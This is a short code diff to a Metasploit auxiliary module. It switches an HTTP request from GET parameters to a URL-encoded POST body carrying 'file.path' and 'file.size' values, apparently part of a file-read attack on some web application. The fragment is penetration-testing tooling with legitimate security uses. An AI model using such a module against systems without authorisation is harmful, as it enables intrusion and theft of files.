@@ -1,4 +1,3 @@
-# frozen_string_literal: true
 
 ##
 # This module requires Metasploit: https://metasploit.com/download
@@ -142,11 +141,11 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi(
         'method' => route[:method],
         'uri' => uri,
-        'vars_get' => {
+'ctype' => 'application/x-www-form-urlencoded',
+        'vars_post' => {
           'file' => '',
           'file.path' => file_path,
-          'file.size' => '1',
-          'Content-Type' => 'application/x-www-form-urlencoded'
+          'file.size' => '1'
         }
       )
       next unless res
